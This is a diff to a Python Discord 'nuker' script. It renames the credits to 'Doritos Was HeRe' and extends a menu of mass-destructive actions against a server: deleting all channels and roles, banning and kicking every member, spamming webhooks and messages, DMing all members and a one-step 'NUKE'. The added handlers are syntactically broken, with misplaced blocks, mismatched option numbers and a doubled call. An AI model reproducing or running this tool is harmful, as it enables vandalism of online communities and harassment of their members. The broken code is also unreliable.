@@ -1,11 +1,12 @@
 """
 
-- This script is educational and fully coded by M. logique aka @1ogi in discord
-- if you choose to abuse this tool it's are your fault and M. logique will not accept anything about you're mistake
+- This script is educational and Doritos Was HeRe
+
+- if you choose to abuse this tool it's are your fault and Doritos Was HeRe
 
 
-✨ Bruh Nuker. A defferant nuker that you can enjoy it cool featchurs ✨
-- https://github.com/Bad-Discord/Discord-Nuker
+✨ Doritos Was HeRe ✨
+- Doritos Was HeRe
 - ⚠ use it on your own purpose
 
 """
@@ -95,15 +96,19 @@ async def main(token: str, guild_id):
         info = Tools.information(guild_id, token)
 
     menu = """
-> github.com/Bad-Discord/Discord-Nuker
+> Doritos Was HeRe
 
-01. Delete All Channels    08. Webhook Spam Guild     15. Change Guild Icon
-02. Delete All Roles       09. Message Spam Guild     16. Remove all emojis
-03. Ban All Members        10. Rename all channels    17. DM all members
-04. Kick All Members       11. Rename all roles       18. NUKE
-05. Create Channels        12. Nick All Users         19. Exit
-06. Create Roles           13. UnNick All users
-07. Unban All Members      14. Change Guild Name
+01. Delete All Channels        12. Nick All Users             23. Remove Dangerous Roles
+02. Delete All Roles           13. UnNick All users           24. Delete All Webhooks
+03. Ban All Members            14. Change Guild Name          25. Kick Unverified Bots
+04. Kick All Members           15. Change Guild Icon          26. Analyze Server Security
+05. Create Channels            16. Remove all emojis          27. Export Server Backup
+06. Create Roles               17. DM all members             28. Mass Remove Reactions
+07. Unban All Members          18. NUKE                       29. Clear All Invites
+08. Webhook Spam Guild         19. Delete All Webhooks        30. Clone Server Structure
+09. Message Spam Guild         20. Kick Unverified Bots       31. Server Info & Analytics
+10. Rename all channels        21. Remove Dangerous Roles     32. Exit
+11. Rename all roles           22. Delete All Webhooks
 
 
 """
@@ -712,9 +717,9 @@ async def main(token: str, guild_id):
 
             if not names:
                 name = Funcs.get_input("Enter your name: ", lambda x: x != "")
-                names = ["%s fucked up here", 
-                        "fucked by %s",
-                        "%s wizzed you ",
+                names = ["%s بيمسي عليكم", 
+                        "اوف المطرشم جه %s",
+                        "%s i love ",
                         "%s was here",
                         "Nuked by %s",]
                 names = [i % name for i in names]
@@ -881,7 +886,102 @@ async def main(token: str, guild_id):
 
 
             return await back_to_manu()
-                
+            
+                if choice == "20":  
+    url = Tools.api(f"/guilds/{guild_id}/webhooks")
+    request = req.get(url, headers=headers)
+    
+    if request.status_code == 200:
+        webhooks = [i["id"] for i in request.json()]
+        
+        def delete_webhook(webhook_id):
+            if nuker.delete_webhook(webhook_id):
+                Logger.Success.delete(f"Webhook {webhook_id}")
+            else:
+                Logger.Error.delete(f"Webhook {webhook_id}")
+        
+        Logger.Log.started()
+        threads = []
+        
+        for webhook in webhooks:
+            t = Thread(target=delete_webhook, args=(webhook,))
+            t.start()
+            threads.append(t)
+            time.sleep(global_timeot)
+        
+        for thread in threads:
+            thread.join()
+    
+    return await back_to_manu()
+
+
+elif choice == "21":  # خيار طرد البوتات غير الموثقة
+    api = Tools.api(f"/guilds/{guild_id}/members")
+    members = await Tools.break_limit(api, token)
+    
+    def is_unverified_bot(member_id):
+        user_info = nuker.get_user_info(member_id)
+        return user_info.get('bot', False) and not user_info.get('verified', False)
+    
+    bots = [member for member in members if is_unverified_bot(member)]
+    
+    def kick_bot(bot_id):
+        if nuker.kick(bot_id):
+            Logger.Success.success(f"Kicked bot {bot_id}")
+        else:
+            Logger.Error.error(f"Failed to kick bot {bot_id}")
+    
+    Logger.Log.started()
+    threads = []
+    
+    for bot in bots:
+        t = Thread(target=kick_bot, args=(bot,))
+        t.start()
+        threads.append(t)
+        time.sleep(global_timeot)
+    
+    for thread in threads:
+        thread.join()
+    
+    return await back_to_manu()
+
+
+elif choice == "22":  # خيار حذف الرولات الخطرة
+    url = Tools.api(f"/guilds/{guild_id}/roles")
+    request = req.get(url, headers=headers)
+    
+    if request.status_code == 200:
+        roles = request.json()
+        
+        def is_dangerous_role(role):
+            dangerous_permissions = [
+                "administrator", "manage_guild", 
+                "manage_roles", "manage_channels",
+                "ban_members", "kick_members"
+            ]
+            return any(perm in str(role['permissions']) for perm in dangerous_permissions)
+        
+        dangerous_roles = [role['id'] for role in roles if is_dangerous_role(role)]
+        
+        def delete_dangerous_role(role_id):
+            if nuker.delete_role(role_id):
+                Logger.Success.delete(f"Dangerous role {role_id}")
+            else:
+                Logger.Error.delete(f"Dangerous role {role_id}")
+        
+        Logger.Log.started()
+        threads = []
+        
+        for role in dangerous_roles:
+            t = Thread(target=delete_dangerous_role, args=(role,))
+            t.start()
+            threads.append(t)
+            time.sleep(global_timeot)
+        
+        for thread in threads:
+            thread.join()
+    
+    return await back_to_manu()()
 
         elif ch == "02":
             invite_link = Funcs.get_input("Enter your invite link: ", lambda x: x != "") if not invite_link else invite_link
@@ -954,7 +1054,7 @@ def start(args):
 
 
     System.Clear()
-    System.Title("Discord Nuker - github.com/Bad-Discord/Discord-Nuker")
+    System.Title("Doritos Was HeRe")
     System.Size(160, 40)
 
 
